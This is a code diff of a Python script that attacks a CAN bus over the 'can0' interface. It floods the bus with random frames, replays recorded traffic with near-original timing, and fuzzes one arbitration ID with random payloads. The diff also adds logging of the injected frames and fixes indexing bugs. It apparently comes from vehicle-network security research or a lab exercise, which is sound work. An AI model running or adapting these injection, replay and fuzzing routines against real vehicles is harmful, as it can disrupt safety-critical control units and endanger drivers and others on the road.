@@ -10,6 +10,17 @@ can.rc['channel'] = 'can0'
 can.rc['bitrate'] = 500000
 from can.interface import Bus
 msgToSend = []
+extendIt = False
+saveAttackString = []
+
+def saveAttackInfo(msg):
+    saveAttackString.append(msg)
+def saveAttackOnFile():
+    a = open("attack3Save.txt","w")
+    for i in saveAttackString:
+        a.write(str(i["id"]) + " " + str(i["msg"] )+ "\n")
+
+    a.close()
 
 def infoGet():
     f = open("testeLog.txt", "r")
@@ -28,6 +39,7 @@ def infoGet():
             for j in i[4:]:
                 msgBody.append(int(j, 16))
         msgToSend.append((msgTime, msgHeader, msgBody))
+
 
 def send_one(msg):
     """Sends a single message."""
@@ -53,11 +65,11 @@ def attackOne(msgToSend):
                     random.randint(0, 254), 
                     random.randint(0, 254), 
                     random.randint(0, 254)], 
-            is_extended_id = True)
+            is_extended_id = extendIt)
         )
-    actual = time.time()
-    if((actual - prev) > 60.0):
-        stop = False
+        actual = time.time()
+        if((actual - prev) > 60.0):
+            stop = False
 
 def attackTwo(msgToSend):
     prev = time.time()
@@ -65,7 +77,7 @@ def attackTwo(msgToSend):
     while(stop):
         for i in range(0, 1000):
             msg = can.Message(
-                arbitration_id = msgToSend[i][1], data = msgToSend[i][2], is_extended_id = True
+                arbitration_id = msgToSend[i][1], data = msgToSend[i][2], is_extended_id = extendIt
             )
             time.sleep(msgToSend[i + 1][0] * 0.98)
             send_one(msg)
@@ -76,22 +88,25 @@ def attackTwo(msgToSend):
 def attackThree(msgToSend):
     prev = time.time()
     stop = True
-    
+
     while(stop):
         for i in range(0, 200):
-            msgLen = len(msgToSend[i][2])
+            msgLen = len(msgToSend[0][2])
             dataToSend = []
-            for i in range(msgLen):
+            for j in range(msgLen):
                 dataToSend.append(random.randint(0, 254))
             #print(dataToSend)
             msg = can.Message(
-                arbitration_id = msgToSend[i][1], data = dataToSend, is_extended_id = True
+                arbitration_id = msgToSend[0][1], data = dataToSend, is_extended_id = extendIt
             )   
             time.sleep(msgToSend[i+1][0] * 0.98)
             send_one(msg)
+            saveAttackInfo({"id": msgToSend[0][1], "msg": dataToSend})
+
         actual = time.time()
         if((actual - prev) > 60.0):
             stop = False
+    saveAttackOnFile()
 
 if __name__ == "__main__":
     infoGet()
@@ -112,7 +127,7 @@ if __name__ == "__main__":
                         random.randint(0, 254), 
                         random.randint(0, 254), 
                         random.randint(0, 254)], 
-                is_extended_id = True)
+                is_extended_id = extendIt)
             )
         elif pressedKey == '1': 
             attackOne(msgToSend)
